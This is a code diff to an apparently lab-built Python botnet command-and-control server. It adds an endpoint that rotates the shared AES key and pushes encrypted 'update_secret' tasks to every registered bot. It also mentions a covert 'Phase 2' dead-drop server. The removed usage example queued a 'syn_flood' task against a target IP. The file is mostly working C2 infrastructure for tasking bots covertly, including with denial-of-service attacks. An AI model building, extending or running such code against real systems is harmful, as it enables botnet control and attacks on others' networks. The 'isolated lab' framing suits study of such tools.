@@ -81,18 +81,22 @@ C2_SECRET    = b"AUA_LAB_2026_KEY"   # Must match AUTH_TOKEN logic in bot_agent.
 AES_KEY      = derive_key(C2_SECRET)
 AUTH_TOKEN   = "LAB_RESEARCH_TOKEN_2026"
 
+# Mutable key state — updated by /rotate_key
+_current_secret = C2_SECRET
+_current_key    = AES_KEY
+
 # ── Encryption helpers ────────────────────────────────────────
 
 def encrypt_task(task: dict) -> dict:
     """
     Encrypt a task dict for delivery to a bot.
-    Returns a wrapper dict with base64 ciphertext + nonce.
-    The bot decrypts using the shared key + nonce.
+    Always uses the current key (_current_key), which may have been
+    rotated by a /rotate_key call since server startup.
     """
-    nonce     = datetime.utcnow().strftime("%Y-%m-%d-%H-%M")
-    iv        = derive_iv(nonce)
-    plaintext = json.dumps(task).encode()
-    ciphertext = aes_cbc_encrypt(plaintext, AES_KEY, iv)
+    nonce      = datetime.utcnow().strftime("%Y-%m-%d-%H-%M")
+    iv         = derive_iv(nonce)
+    plaintext  = json.dumps(task).encode()
+    ciphertext = aes_cbc_encrypt(plaintext, _current_key, iv)
     return {
         "enc":   1,
         "nonce": nonce,
@@ -107,9 +111,9 @@ def decrypt_task(payload: dict) -> dict | None:
         nonce      = payload["nonce"]
         iv         = derive_iv(nonce)
         ciphertext = base64.b64decode(payload["data"])
-        plaintext  = aes_cbc_decrypt(ciphertext, AES_KEY, iv)
+        plaintext  = aes_cbc_decrypt(ciphertext, _current_key, iv)
         return json.loads(plaintext.decode())
-    except Exception as e:
+    except Exception:
         return None
 
 # ── Encrypted C2 server ───────────────────────────────────────
@@ -252,15 +256,88 @@ def push_task():
 
 @app.route("/encrypt_test", methods=["POST"])
 def encrypt_test():
-    """Debug endpoint: show encryption of a sample task."""
+    """Debug endpoint: show encryption of a sample task using the current key."""
     task = request.get_json() or {"type": "idle"}
     enc  = encrypt_task(task)
     dec  = decrypt_task(enc)
     return jsonify({
-        "original": task,
+        "original":  task,
         "encrypted": enc,
         "decrypted": dec,
-        "key_hex": AES_KEY.hex(),
+        "key_hex":   _current_key.hex(),
+    })
+
+
+@app.route("/rotate_key", methods=["POST"])
+def rotate_key():
+    """
+    Rotate the shared AES key used to encrypt tasks for bots.
+
+    Steps performed:
+      1. Derives the new AES key from the provided secret.
+      2. Queues an 'update_secret' task for every registered bot,
+         encrypted with the OLD key so current bots can decrypt it.
+      3. Switches _current_key to the new key so all subsequent
+         /task deliveries use the new key.
+
+    Body (requires X-Auth-Token header):
+      {"secret": "<new_shared_secret>"}    (min 8 characters)
+
+    Workflow:
+      a. Call POST /rotate_key {"secret":"NEW_KEY"} on the C2 server.
+         → All bots receive update_secret on their next heartbeat,
+           still encrypted with the old key.
+      b. Wait ≥ one heartbeat interval (5 s) for all bots to pick up
+         the rotation command and switch their local key.
+      c. All subsequent /task calls are now encrypted with the new key.
+
+    If using the Phase 2 dead-drop server, also call:
+      POST http://192.168.100.10:5001/push_key {"secret":"NEW_KEY"}
+    so Phase 2 bots (covert_bot.py) receive the rotation too.
+    """
+    if not auth(request):
+        return jsonify({"error": "unauthorized"}), 403
+
+    global _current_secret, _current_key
+
+    data       = request.get_json(silent=True) or {}
+    new_secret = data.get("secret", "")
+
+    if not new_secret or len(new_secret) < 8:
+        return jsonify({"error": "secret must be at least 8 characters"}), 400
+
+    new_secret_bytes = new_secret.encode()
+    new_key          = derive_key(new_secret_bytes)
+
+    # Queue update_secret for every registered bot, signed with OLD key
+    rotation_task = {
+        "type":       "update_secret",
+        "secret":     new_secret,
+        "issued_at":  datetime.now().isoformat(),
+    }
+    queued_count = 0
+    with lock:
+        for bot_id, q in TASK_QUEUES.items():
+            q.put(rotation_task)
+            queued_count += 1
+
+    old_key_hex = _current_key.hex()
+
+    # Switch to new key — all subsequent encrypt_task() calls use it
+    _current_secret = new_secret_bytes
+    _current_key    = new_key
+
+    log(f"KEY ROTATION: queued update_secret for {queued_count} bots | "
+        f"old={old_key_hex[:8]}... new={new_key.hex()[:8]}...")
+
+    return jsonify({
+        "status":         "rotated",
+        "bots_notified":  queued_count,
+        "new_key_hex":    new_key.hex(),
+        "note": (
+            f"Bots will receive new key on next heartbeat (~{5}s). "
+            "For Phase 2 bots, also call POST /push_key on the dead-drop server."
+        ),
     })
 
 if __name__ == "__main__":
@@ -270,11 +347,17 @@ if __name__ == "__main__":
     print(" ISOLATED ENVIRONMENT ONLY")
     print(" Listening on 0.0.0.0:5000")
     print("=" * 60)
-    print(f"\n[C2-AES] AES key: {AES_KEY.hex()}")
+    print(f"\n[C2-AES] AES key: {_current_key.hex()}")
     print(f"[C2-AES] (Same key must be in bot_agent for decryption)")
-    print(f"\nTest encryption:")
-    print(f"  curl -X POST http://localhost:5000/encrypt_test \\")
+    print(f"\nEndpoints:")
+    print(f"  POST /task        — push task to bots")
+    print(f"  POST /rotate_key  — rotate AES key (queues update_secret to all bots)")
+    print(f"  GET  /bots        — list registered bots")
+    print(f"  POST /encrypt_test — AES round-trip test")
+    print(f"\nKey rotation example:")
+    print(f"  curl -X POST http://localhost:5000/rotate_key \\")
     print(f"       -H 'Content-Type: application/json' \\")
-    print(f"       -d '{{\"type\":\"syn_flood\",\"target_ip\":\"192.168.100.20\"}}'")
+    print(f"       -H 'X-Auth-Token: LAB_RESEARCH_TOKEN_2026' \\")
+    print(f"       -d '{{\"secret\":\"NEW_KEY_2026_XYZ\"}}'")
     print()
     app.run(host="0.0.0.0", port=5000, debug=False)
